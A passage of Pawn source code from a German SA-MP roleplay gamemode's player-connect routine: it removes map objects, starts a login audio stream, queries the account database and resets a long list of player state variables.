	RemoveBuildingForPlayer(playerid, 3777, 831.9609, -1191.1406, 25.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 3777, 868.1328, -1191.1406, 25.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 5926, 816.3359, -1217.1484, 26.4453, 0.25);
	RemoveBuildingForPlayer(playerid, 6005, 895.2578, -1256.9297, 31.2344, 0.25);
	RemoveBuildingForPlayer(playerid, 5836, 816.3359, -1217.1484, 26.4453, 0.25);
	RemoveBuildingForPlayer(playerid, 3776, 831.9609, -1191.1406, 25.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 3776, 868.1328, -1191.1406, 25.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 5838, 895.2578, -1256.9297, 31.2344, 0.25);
	// O Amt


	// S.W.A.T Interior
	RemoveBuildingForPlayer(playerid, 1722, 231.6172, 181.5938, 1002.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 1722, 231.6172, 182.2578, 1002.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 1722, 231.6172, 182.9063, 1002.0234, 0.25);

//	SetTimerEx("loginkick", 35000, false, "i", playerid);

/*
	if(musikvar == 0)
	{
    PlayAudioStreamForPlayer(playerid, "http://gta-city-reallife.de/login.mp3");
	musikvar =1;
	}
	else if(musikvar == 1)
	{
    PlayAudioStreamForPlayer(playerid, "http://gta-city-reallife.de/sound1.mp3");
	musikvar= 0;
	}
*/
				PlayAudioStreamForPlayer(playerid, "http://gta-reallife.de/streaming/classic/index.php/");
//    PlayAudioStreamForPlayer(playerid, "http://gta-reallife.de/login.mp3");
	// ------- MySql ---------------------------------------------
	new query[256];
	format(query,sizeof(query),"SELECT `id` FROM `accounts` WHERE `name`='%s'",GetName(playerid));
	//mysql_function_query(mysqlcon,query, true, "CheckAcc", "si",GetName(playerid),playerid);
	mysql_pquery(mysqlcon, query, "CheckAcc", "si", GetName(playerid),playerid);





	//-------------------------------------------------------------



/*
	// Tacho
	Benzin_TD[playerid] = TextDrawCreate(151.200057, 362.230926, "-");
	TextDrawLetterSize(Benzin_TD[playerid], 0.147999, 1.077333);
	TextDrawTextSize(Benzin_TD[playerid], 240.000000, 0.000000);
	TextDrawAlignment(Benzin_TD[playerid], 1);
	TextDrawColor(Benzin_TD[playerid], -1);
	TextDrawUseBox(Benzin_TD[playerid], 1);
	TextDrawBoxColor(Benzin_TD[playerid], 255);
	TextDrawSetShadow(Benzin_TD[playerid], 0);
	TextDrawSetOutline(Benzin_TD[playerid], 0);
	TextDrawBackgroundColor(Benzin_TD[playerid], 255);
	TextDrawFont(Benzin_TD[playerid], 2);
	TextDrawSetProportional(Benzin_TD[playerid], 1);
	TextDrawSetShadow(Benzin_TD[playerid], 0);

	KMH_TD[playerid] = TextDrawCreate(151.200027, 400.062011, "-");
	TextDrawLetterSize(KMH_TD[playerid], 0.195199, 0.913066);
	TextDrawTextSize(KMH_TD[playerid], 240.000000, 0.000000);
	TextDrawAlignment(KMH_TD[playerid], 1);
	TextDrawColor(KMH_TD[playerid], -1);
	TextDrawUseBox(KMH_TD[playerid], 1);
	TextDrawBoxColor(KMH_TD[playerid], 255);
	TextDrawSetShadow(KMH_TD[playerid], 0);
	TextDrawSetOutline(KMH_TD[playerid], 0);
	TextDrawBackgroundColor(KMH_TD[playerid], 255);
	TextDrawFont(KMH_TD[playerid], 2);
	TextDrawSetProportional(KMH_TD[playerid], 1);
	TextDrawSetShadow(KMH_TD[playerid], 0);

	Fahrzeug_TD[playerid] = TextDrawCreate(151.200027, 388.115417, "-");
	TextDrawLetterSize(Fahrzeug_TD[playerid], 0.147599, 1.022577);
	TextDrawTextSize(Fahrzeug_TD[playerid], 240.000000, 0.000000);
	TextDrawAlignment(Fahrzeug_TD[playerid], 1);
	TextDrawColor(Fahrzeug_TD[playerid], -1);
	TextDrawUseBox(Fahrzeug_TD[playerid], 1);
	TextDrawBoxColor(Fahrzeug_TD[playerid], 255);
	TextDrawSetShadow(Fahrzeug_TD[playerid], 0);
	TextDrawSetOutline(Fahrzeug_TD[playerid], 0);
	TextDrawBackgroundColor(Fahrzeug_TD[playerid], 255);
	TextDrawFont(Fahrzeug_TD[playerid], 2);
	TextDrawSetProportional(Fahrzeug_TD[playerid], 1);
	TextDrawSetShadow(Fahrzeug_TD[playerid], 0);

	Kilometer_TD[playerid] = TextDrawCreate(151.200012, 350.781982, "-");
	TextDrawLetterSize(Kilometer_TD[playerid], 0.147599, 1.022577);
	TextDrawTextSize(Kilometer_TD[playerid], 240.000000, 0.000000);
	TextDrawAlignment(Kilometer_TD[playerid], 1);
	TextDrawColor(Kilometer_TD[playerid], -1);
	TextDrawUseBox(Kilometer_TD[playerid], 1);
	TextDrawBoxColor(Kilometer_TD[playerid], 255);
	TextDrawSetShadow(Kilometer_TD[playerid], 0);
	TextDrawSetOutline(Kilometer_TD[playerid], 0);
	TextDrawBackgroundColor(Kilometer_TD[playerid], 255);
	TextDrawFont(Kilometer_TD[playerid], 2);
	TextDrawSetProportional(Kilometer_TD[playerid], 1);
	TextDrawSetShadow(Kilometer_TD[playerid], 0);

	Umgebung_TD[playerid] = TextDrawCreate(151.200042, 375.173156, "-");
	TextDrawLetterSize(Umgebung_TD[playerid], 0.143599, 1.112177);
	TextDrawTextSize(Umgebung_TD[playerid], 240.000000, 0.000000);
	TextDrawAlignment(Umgebung_TD[playerid], 1);
	TextDrawColor(Umgebung_TD[playerid], -1);
	TextDrawUseBox(Umgebung_TD[playerid], 1);
	TextDrawBoxColor(Umgebung_TD[playerid], 255);
	TextDrawSetShadow(Umgebung_TD[playerid], 0);
	TextDrawSetOutline(Umgebung_TD[playerid], 0);
	TextDrawBackgroundColor(Umgebung_TD[playerid], 255);
	TextDrawFont(Umgebung_TD[playerid], 2);
	TextDrawSetProportional(Umgebung_TD[playerid], 1);
	TextDrawSetShadow(Umgebung_TD[playerid], 0);
	//
*/
	// FBI base ....
	RemoveBuildingForPlayer(playerid, 4080, 1787.1328, -1565.6797, 11.9688, 0.25);
	RemoveBuildingForPlayer(playerid, 4000, 1787.1328, -1565.6797, 11.9688, 0.25);



	/*
	// Autoscooter
	RemoveBuildingForPlayer(playerid, 641, 1458.6172, -1684.1328, 11.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1471.4063, -1666.1797, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.3828, -1682.3125, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1458.2578, -1659.2578, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1477.9375, -1652.7266, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1466.4688, -1637.9609, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1465.8906, -1629.9766, 15.5313, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1472.6641, -1627.8828, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1479.4688, -1626.0234, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1480.6094, -1666.1797, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1488.2266, -1666.1797, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1486.1797, -1627.7656, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1494.4141, -1629.9766, 15.5313, 0.25);
	//
	*/

	// BBH
	RemoveBuildingForPlayer(playerid, 6071, 1087.9844, -1682.3281, 19.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1051.8750, -1680.5156, 14.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 615, 1051.2500, -1678.0234, 13.2891, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1055.6172, -1692.6484, 14.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1058.3125, -1695.7656, 14.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 6063, 1087.9844, -1682.3281, 19.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1097.4297, -1699.4219, 14.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 647, 1101.6563, -1699.5625, 14.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 1297, 1130.5391, -1684.3203, 15.8906, 0.25);

	// LSPD Kuppel
//	RemoveBuildingForPlayer(playerid, 620, 1547.5703, -1689.9844, 13.0469, 0.25);
//	RemoveBuildingForPlayer(playerid, 620, 1547.5703, -1661.0313, 13.0469, 0.25);
	//

	// LCM Base
	RemoveBuildingForPlayer(playerid, 718, 2088.8906, 1439.5938, 9.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2088.8906, 1426.4844, 9.7500, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2098.3828, 1384.3203, 9.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 718, 2116.3594, 1384.3281, 9.7656, 0.25);
	//
	// Ordnungsamt
	RemoveBuildingForPlayer(playerid, 7227, 2232.2578, 2017.6094, 11.2031, 0.25);
	//

	//------------------------------------Aktuelles----------------------------------

	// Zoll
	RemoveBuildingForPlayer(playerid, 1290, -1397.7344, 827.5391, 52.7891, 0.25);
	//

	RemoveBuildingForPlayer(playerid, 16094, 191.1406, 1870.0391, 21.4766, 0.25);// Bundeswehr Base


	// Tanke int
	RemoveBuildingForPlayer(playerid, 13245, 666.7109, -565.1328, 17.3359, 0.25);
	RemoveBuildingForPlayer(playerid, 12854, 666.4922, -571.1797, 17.3125, 0.25);
	RemoveBuildingForPlayer(playerid, 12853, 666.7109, -565.1328, 17.3359, 0.25);


	GangZoneShowForPlayer(playerid, Vagos, 0xFFFF0085);
	GangZoneShowForPlayer(playerid, Ballas, 0xFF00807D);
	GangZoneShowForPlayer(playerid, Grove, 0x00FF007D);
	//GangZoneShowForPlayer(playerid, Aztecas, 0x00FFFF7D);
	GangZoneShowForPlayer(playerid, Yakuza, 0xBEBEBE7D);
	GangZoneShowForPlayer(playerid, Russianm, 0x5500007B);
	GangZoneShowForPlayer(playerid, Gangfights, 0xFF00007D);
    GangZoneShowForPlayer(playerid, Triaden, 0x40808096);
	GangZoneShowForPlayer(playerid, LCN, 0x0000004F);

	//--------------------- MySql ----------------------
	new playername2[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername2, sizeof(playername2));
	PlayerInfo[playerid][Name] = playername2;
	//--------------------------------------------------

	if(PlayerInfo[playerid][pJob] == 17)
	{
 		TACheckpoint[playerid] = 0;
 		TBCheckpoint[playerid] = 0;
 		TFCheckpoint[playerid] = 0;
	}

	//Noobspawn Remove
	RemoveBuildingForPlayer(playerid, 5024, 1748.8438, -1883.0313, 14.1875, 0.25);
	/*
	// LSPD Straße
	RemoveBuildingForPlayer(playerid, 4039, 1479.5547, -1592.2891, 12.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 3994, 1479.5547, -1592.2891, 12.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 4149, 1427.0547, -1662.2891, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 4163, 1469.3359, -1732.2891, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 4164, 1469.3359, -1732.2891, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 4148, 1427.0547, -1662.2891, 12.4609, 0.25);

	// Straße LSPD
	RemoveBuildingForPlayer(playerid, 3992, 1755.6016, -1782.3047, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 4035, 1360.7578, -1802.2500, 12.4922, 0.25);
	RemoveBuildingForPlayer(playerid, 4036, 1603.8125, -1863.3438, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 4037, 1755.6016, -1782.3047, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 4038, 1719.9375, -1662.2891, 12.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 4107, 1360.7578, -1802.2500, 12.4922, 0.25);
	RemoveBuildingForPlayer(playerid, 4147, 1371.0000, -1582.3438, 12.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 4156, 1739.8125, -1602.1953, 12.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 4157, 1739.8125, -1602.1953, 12.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 4159, 1609.5547, -1732.3281, 12.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 4161, 1686.6250, -1806.4297, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 4162, 1569.9375, -1802.2891, 12.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 4165, 1469.5234, -1872.3750, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 4166, 1469.5234, -1872.3750, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 4207, 1603.8125, -1863.3438, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 4233, 1603.9063, -1592.2969, 12.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 4234, 1603.9063, -1592.2969, 12.5469, 0.25);
	RemoveBuildingForPlayer(playerid, 4146, 1371.0000, -1582.3438, 12.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 4209, 1569.9375, -1802.2891, 12.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 4158, 1609.5547, -1732.3281, 12.4688, 0.25);
	RemoveBuildingForPlayer(playerid, 4160, 1686.6250, -1806.4297, 12.4609, 0.25);
	RemoveBuildingForPlayer(playerid, 3993, 1719.9375, -1662.2891, 12.4688, 0.25);
	*/
/*
    Desktop_Check[playerid] = 0;
    Desktop_Timer_Started[playerid] = 0;
    Desktop_Status[playerid] = 0;
*/


	for(new i=0; i<MAX_newsObjekt; i++) // Online kommen wird alles auf null gesetzt
	{
		newssperrespawned[i] = 0;
		newsSperre[playerid][i] = 0;
	}



	for(new i=0; i<MAX_Objekt; i++) // Online kommen wird alles auf null gesetzt
	{
		sperrespawned[i] = 0;
		Sperre[playerid][i] = 0;
		Objekt[playerid] = 0;
	}
/*
	new xDIP[16];
	GetPlayerIp(playerid,xDIP,16);
	if(!strcmp(xDIP,"175.132.",false,8))
	{
		if(strcmp(xDIP[8],"0.100",false,5))
		if(strcmp(xDIP[8],"0.101",false,5))
		if(strcmp(xDIP[8],"0.102",false,5))
		SetPlayerSkin(playerid, 560);
	}
*/



/*
	{
    SendClientMessage(playerid, COLOR_LIGHTBLUE," ");
    SendClientMessage(playerid, COLOR_LIGHTBLUE," ");
    SendClientMessage(playerid, COLOR_LIGHTBLUE," ");
    SendClientMessage(playerid, COLOR_LIGHTBLUE," ");
    SendClientMessage(playerid, COLOR_LIGHTBLUE," ");
    SendClientMessage(playerid, COLOR_LIGHTBLUE," ");
    SendClientMessage(playerid, COLOR_LIGHTBLUE," ");
	}
*/
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_WHITE, " ");
	SendClientMessage(playerid, COLOR_GRAD1, "Verbinde mit GTA-City Reallife");
//------------------------------------------------------------------------------

    TextDrawShowForPlayer(playerid,Copyright);
    TextDrawShowForPlayer(playerid,Datum);


    // gf


    //






	///
	TicketZeile[playerid] = 0;
	SupportTicket[playerid] = 0;
	TicketAngenommen[playerid] = 0;
	DeinSupport[playerid] = 0;

	if(Security != 0)
	{
	    SendClientMessage(playerid, COLOR_YELLOW, "Host hat die Regeln gebrochen Maßnahmen wurden eingeleitet.");
	    Kick(playerid);
	    return 1;
	}
	gActivePlayers[playerid]++;
	numplayers++;

    AntiAdminAbuse[playerid] =0;  PlayerInfo[playerid][AktivImEvent] = 0; PlayerInfo[playerid][EventKills] = 0; RennenHerausforderer[playerid] = INVALID_PLAYER_ID;
	InCargo[playerid] = 0; InLevi[playerid] = 0; InEnfo[playerid] = 0; KennzeichenErlaubnis[playerid] = 0; KennzeichenErlaubnis1[playerid] = 0;
	SelectChar[playerid] = 0; HidePM[playerid] = 0; PhoneOnline[playerid] = 0; TakeOver[playerid] = 255;
	SelectCharID[playerid] = 0; SelectCharPlace[playerid] = 0; ChosenSkin[playerid] = 0; Maske[playerid] = 0;
	GettingJob[playerid] = 0; GuardOffer[playerid] = 999; GuardPrice[playerid] = 0; gPlayerUsingLoopingAnim[playerid] = 0; gPlayerAnimLibsPreloaded[playerid] = 0;
	KickPlayer[playerid] = 0; CurrentMoney[playerid] = 0; UsedFind[playerid] = 0;
	CP[playerid] = 0; Robbed[playerid] = 0; SpawnChange[playerid] = 1; BlindFold[playerid] = 0; //Noobi[playerid] = 0;
	CarOffer[playerid] = 999; CarPrice[playerid] = 0; CarID[playerid] = 0; CarCalls[playerid] = 0;
	RobbedTime[playerid] = 0; MoneyMessage[playerid] = 0; Condom[playerid] = 0; AktuellerCP[playerid] = INVALID_FARMER_CP;
	STDPlayer[playerid] = 0; SexOffer[playerid] = 999; SexPrice[playerid] = 0;
	RepairOffer[playerid] = 999; RepairPrice[playerid] = 0; RepairCar[playerid] = 0; NagelBandErstellt[playerid] = 0;
	TalkingLive[playerid] = 255; LiveOffer[playerid] = 999; PaketStatus[playerid] = 999; StatsStatus[playerid] = 999; CarDarfKeyNetChangen[playerid] = 0; CarStatus[playerid] = 999; SkinStatus[playerid] = 999; TakingLesson[playerid] = 0; AnwaltStatus[playerid] = 999; MechanikerAccept[playerid] = 999;
	RefillOffer[playerid] = 999; RefillPrice[playerid] = 0; MapIconsShown[playerid] = 0;
	DrugOffer[playerid] = 999; PlayerCuffed[playerid] = 0; PlayerCuffedTime[playerid] = 0;
	DrugPrice[playerid] = 0; RegistrationStep[playerid] = 0; OnCK[playerid] = 999; GettingCK[playerid] = 999;
	DrugGram[playerid] = 0; Mats[playerid] = 0; OrderReady[playerid] = 0;
	JailPrice[playerid] = 0; MedicTime[playerid] = 0; NeedMedicTime[playerid] = 0; MedicBill[playerid] = 0; GotHit[playerid] = 0;
	WantedPoints[playerid] = 0; GoChase[playerid] = 999; GetChased[playerid] = 999; PlacedNews[playerid] = 0;
	OnDuty[playerid] = 0; WantedLevel[playerid] = 0; TestFishes[playerid] = 0; FonDuty[playerid] = 0;
	BoxWaitTime[playerid] = 0; SchoolSpawn[playerid] = 0; ChangePos2[playerid][1] = 0;
	SafeTime[playerid] = 60; TransportDuty[playerid] = 0; PlayerTied[playerid] = 0;
	BusCallTime[playerid] = 0; TaxiCallTime[playerid] = 0; MedicCallTime[playerid] = 0; CopCallTime[playerid] = 0; MechanicCallTime[playerid] = 0; Spectatepos[playerid] = 0;
	FindTimePoints[playerid] = 0; FindTime[playerid] = 0; JobDuty[playerid] = 0;
	Mobile[playerid] = 255; Music[playerid] = 0; BoxOffer[playerid] = 999; PlayerBoxing[playerid] = 0;
	Spectate[playerid] = 255; PlayerDrunk[playerid] = 0; PlayerDrunkTime[playerid] = 0;
	Unspec[playerid][sLocal] = 255; FishCount[playerid] = 0;
	WritingPaper[playerid] = 0; WritingPaperNumber[playerid] = 999; WritingLine[playerid] = 0; BringingPaper[playerid] = 0; GotPaper[playerid] = 0;
	PaperOffer[playerid] = 999; ConsumingMoney[playerid] = 0;
    gLastCar[playerid] = 0; FirstSpawn[playerid] = 1; AtClothes[playerid] = 0; AdminDuty[playerid] = 0;
	gOoc[playerid] = 0; gNews[playerid] = 0; BigEar[playerid] = 0; gDice[playerid] = 0; gFam[playerid] = 0;
	gSpeedo[playerid] = 0; gGas[playerid] = 0; AllowPerso[playerid] = 0;
	//Handy Vertrag
	PlayerInfo[playerid][pHandyGeld] = 5; PlayerInfo[playerid][pHandyVer] = 0;
	gPlayerLogged[playerid] = 0; gPlayerLogTries[playerid] = 0; gPlayerAccount[playerid] = 0; //gPlayerLogTries[playerid] = 0;
	gPlayerSpawned[playerid] = 0; PlayerKarting[playerid] = 0; PlayerInKart[playerid] = 0;
	PlayerTazeTime[playerid] = 0; PlayerStoned[playerid] = 0;
	StartTime[playerid] = 0; TicketOffer[playerid] = 999; TicketMoney[playerid] = 0;
	MatsHolding[playerid] = 0; TutTime[playerid] = 0;
	TaxiAccepted[playerid] = 999; BusAccepted[playerid] = 999; ReportCall[playerid] = 999;

	PlayerInfo[playerid][pCash] = 0;
//	PlayerInfo[playerid][pCash] = dollah;
	NoFuel[playerid] = 0;
	HireCar[playerid] = 299; PlayersChannel[playerid] = 999;
	TransportValue[playerid] = 0; TransportMoney[playerid] = 0; TransportTime[playerid] = 0; TransportCost[playerid] = 0; TransportDriver[playerid] = 999;
	Locator[playerid] = 0; JustReported[playerid] = 0; PlayerNeedsHelp[playerid] = 0;
	WatchingTV[playerid] = 0; PlayerPaintballing[playerid] = 0; PlayerPaintballKills[playerid] = 0;
	Fishes[playerid][pLastFish] = 0; Fishes[playerid][pFishID] = 0;
	ProposeOffer[playerid] = 999; MarryWitness[playerid] = 999; MarryWitnessOffer[playerid] = 999; MarriageCeremoney[playerid] = 0; ProposedTo[playerid] = 999; GotProposedBy[playerid] = 999; DivorceOffer[playerid] = 999;
	ZigOffer[playerid] = 999;
//	GivePlayerMoneySave(playerid,PlayerInfo[playerid][pCash] = 25000);
	PlayerInfo[playerid][pLevel] = 2;
	PlayerInfo[playerid][pAdmin] = 0;
	PlayerInfo[playerid][pSupporter] = 0;
	PlayerInfo[playerid][pDonateRank] = 0;
	PlayerInfo[playerid][gPupgrade] = 0;
	PlayerInfo[playerid][pConnectTime] = 0;
 	PlayerInfo[playerid][pReg] = 0;
	PlayerInfo[playerid][pSex] = 0;
	PlayerInfo[playerid][pAge] = 0;
	PlayerInfo[playerid][pSkinauswahl] = 0;

	PlayerInfo[playerid][pRobstore] = 0;

	PlayerInfo[playerid][pPrisonCPs] = 0;
	PlayerInfo[playerid][pAutoFarbe] = 0;

	PlayerInfo[playerid][pOrgMember] = 0;
	PlayerInfo[playerid][pOrgRang] = 0;

	PlayerInfo[playerid][pKek9] = 0;


	PlayerInfo[playerid][pOrigin] = 0;
	PlayerInfo[playerid][pExp] = 0;
	PlayerInfo[playerid][pAccount] = 0;
	PlayerInfo[playerid][pPlayerKredit] = 0;
	PlayerInfo[playerid][pPlayerKreditDauer] = 0;
	PlayerInfo[playerid][pCrimes] = 0;
	PlayerInfo[playerid][pDeaths] = 0;
	PlayerInfo[playerid][pArrested] = 0;
	PlayerInfo[playerid][pWantedDeaths] = 0;
	PlayerInfo[playerid][pPhoneBook] = 0;
	PlayerInfo[playerid][pLottoNr] = 0;
	PlayerInfo[playerid][pFishes] = 0;
	PlayerInfo[playerid][pBiggestFish] = 0;
	PlayerInfo[playerid][pJob] = 0;
	PlayerInfo[playerid][pPayCheck] = 0;
	PlayerInfo[playerid][pHeadValue] = 0;
	PlayerInfo[playerid][pPrison] = 0;
	PlayerInfo[playerid][pJailed] = 0;
	PlayerInfo[playerid][pGangJailed] = 0;
	PlayerInfo[playerid][pBankrob] = 0;
	PlayerInfo[playerid][pTotTime] = 0;
	PlayerInfo[playerid][pJailTime] = 0;
	PlayerInfo[playerid][pMauled] = 0;
	PlayerInfo[playerid][pMats] = 0;
	PlayerInfo[playerid][pDrugs] = 0;
	PlayerInfo[playerid][pBoxMats] = 0;
	PlayerInfo[playerid][pBoxDrugs] = 0;
	PlayerInfo[playerid][pLeader] = 0;
	PlayerInfo[playerid][pMember] = 0;
	PlayerInfo[playerid][pPersoStop] = 0;
	PlayerInfo[playerid][pOwnPerso] = 0;
	PlayerInfo[playerid][pOwnAntrag] = 0;
	PlayerInfo[playerid][pFMember] = 255;
	PlayerInfo[playerid][pRank] = 0;
	PlayerInfo[playerid][pChar] = 0;
	PlayerInfo[playerid][pContractTime] = 0;
	PlayerInfo[playerid][pDetSkill] = 0;
	PlayerInfo[playerid][pSexSkill] = 0;
	PlayerInfo[playerid][pBoxSkill] = 0;
	PlayerInfo[playerid][pLawSkill] = 0;
	PlayerInfo[playerid][pMechSkill] = 0;
	PlayerInfo[playerid][pJackSkill] = 0;
	PlayerInfo[playerid][pCarSkill] = 0;
	PlayerInfo[playerid][pNewsSkill] = 0;
	PlayerInfo[playerid][pDrugsSkill] = 0;
	PlayerInfo[playerid][pCookSkill] = 0;
	PlayerInfo[playerid][pFishSkill] = 0;
	PlayerInfo[playerid][pSHealth] = 0;
	PlayerInfo[playerid][pHealth] = 50.0;
	PlayerInfo[playerid][pPos_x] = 2246.6;
	PlayerInfo[playerid][pPos_y] = -1161.9;
	PlayerInfo[playerid][pPos_z] = 1029.7;
	PlayerInfo[playerid][pInt] = 15;
	PlayerInfo[playerid][pLocal] = 999;
	PlayerInfo[playerid][pPtankekey] = 255;
	PlayerInfo[playerid][pTeam] = 3;
	PlayerInfo[playerid][pModel] = 2;//264
	new randphone = 10000 + random(89999);//minimum 1000  max 9999 //giving one at the start
	PlayerInfo[playerid][pPnumber] = randphone;
	PlayerInfo[playerid][pHouseKey] = 999;
	PlayerInfo[playerid][pPbiskey] = 255;
	PlayerInfo[playerid][pCarLic] = 0;
	PlayerInfo[playerid][pNewLic] = 0;
	PlayerInfo[playerid][pFlyLic] = 0;
	PlayerInfo[playerid][pBoatLic] = 0;
	PlayerInfo[playerid][pFishLic] = 0;
	PlayerInfo[playerid][pGunLic] = 0; // hier wird gesagt das der Spieler beim /register kein schein bekommt
	PlayerInfo[playerid][pRollerLic] = 0;
	PlayerInfo[playerid][pLKWLic] = 0;
	PlayerInfo[playerid][pMotoLic] = 0;
	PlayerInfo[playerid][pZig] = 0;
	PlayerInfo[playerid][pKekse] = 0;
	PlayerInfo[playerid][pZigSucht] = 0;
	PlayerInfo[playerid][pGun1] = 0;
	PlayerInfo[playerid][pGun2] = 0;
	PlayerInfo[playerid][pGun3] = 0;
	PlayerInfo[playerid][pGun4] = 0;
	PlayerInfo[playerid][pAmmo1] = 0;
	PlayerInfo[playerid][pAmmo2] = 0;
	PlayerInfo[playerid][pAmmo3] = 0;
	PlayerInfo[playerid][pAmmo4] = 0;
	PlayerInfo[playerid][pMulltime] = 0;
	PlayerInfo[playerid][pCarTime] = 0;
	PlayerInfo[playerid][pTx] = 0;
	PlayerInfo[playerid][pTy] = 0;
	PlayerInfo[playerid][pTz] = 0;
	PlayerInfo[playerid][pPayDay] = 0;
	PlayerInfo[playerid][pPayDayHad] = 0;
	PlayerInfo[playerid][pCDPlayer] = 0;
	PlayerInfo[playerid][pWins] = 0;
	PlayerInfo[playerid][pLoses] = 0;
	PlayerInfo[playerid][pAlcoholPerk] = 0;
	PlayerInfo[playerid][pDrugPerk] = 0;
	PlayerInfo[playerid][pMiserPerk] = 0;
	PlayerInfo[playerid][pPainPerk] = 0;
	PlayerInfo[playerid][pInvWeapon] = 0;
	PlayerInfo[playerid][pFlugTime] = 0;
	PlayerInfo[playerid][pFarmTime] = 0;
	PlayerInfo[playerid][pGDeaths] = 0;
	PlayerInfo[playerid][pGKills] = 0;
	PlayerInfo[playerid][pInvMats] = 0;
	PlayerInfo[playerid][pInvDrugs] = 0;
	PlayerInfo[playerid][pInvAmmo] = 0;
	PlayerInfo[playerid][pInvWeapon2] = 0;
	PlayerInfo[playerid][pInvAmmo2] = 0;
	PlayerInfo[playerid][pTraderPerk] = 0;
	PlayerInfo[playerid][pTut] = 0;
	PlayerInfo[playerid][pErstehilfe] = 0;
	PlayerInfo[playerid][pHitsound] = 0;
	PlayerInfo[playerid][pMeldung] = 0;
	PlayerInfo[playerid][pWarns] = 0;
	PlayerInfo[playerid][pFuel] = 0;
	PlayerInfo[playerid][pAdjustable] = 0;
	PlayerInfo[playerid][pPlayMinutes] = 0;
	PlayerInfo[playerid][pGesamtMinutes] = 0;
	PlayerInfo[playerid][pMinutesSinceLogin] = 0;
    PlayerInfo[playerid][sMember] = 0;
	PlayerInfo[playerid][pMinutesSinceAn] = 0;
	PlayerInfo[playerid][pSFPASS] = 0;
	PlayerInfo[playerid][pLVPASS] = 0;
	PlayerInfo[playerid][pFrakSperre] = 0;
	PlayerInfo[playerid][pGehalt] = 0;
	PlayerInfo[playerid][pTot] = 0;
	PlayerInfo[playerid][pZollPass] = 0;
	PlayerInfo[playerid][pZollPassTime] = 0;
	PlayerInfo[playerid][pGebannt] = 0;
	PlayerInfo[playerid][pFightingStyle] = 0;
	PlayerInfo[playerid][pTemp] = 0;
	PlayerInfo[playerid][pCheckAcc] = 0;
	ExtTimer[playerid] = -1;
	PlayerInfo[playerid][pAdminTickets] = 0;
	PlayerInfo[playerid][paMuted] = 0;
	PlayerInfo[playerid][pMuted] = 0;
	PlayerInfo[playerid][pMutedTime] = 0;
    PlayerInfo[playerid][pCarP] = 0;
	pIstTot[playerid] = 0;
	TazerBereit[playerid] = 1;
	WeapsTaken[playerid] = 0;
	Eingeladen[playerid] = 0;
	TextSpams[playerid] = 0;
	CMDSpams[playerid] = 0;
	need[playerid] = 0;
//============================================
//============================================
//============================================
//	MultipleEnter[playerid] = -1;
//	CheckPointing[playerid] = 1;
//	CheckPointShown[playerid] = 0;
	ZivilSkin[playerid] = 0;
	PruefungsSchritt[playerid] = 0;
	MotorradSchritt[playerid] = 0;
	ClearCrime(playerid);
	ClearFishes(playerid);
	ClearCooking(playerid);
	ClearGroceries(playerid);
	ClearMarriage(playerid);
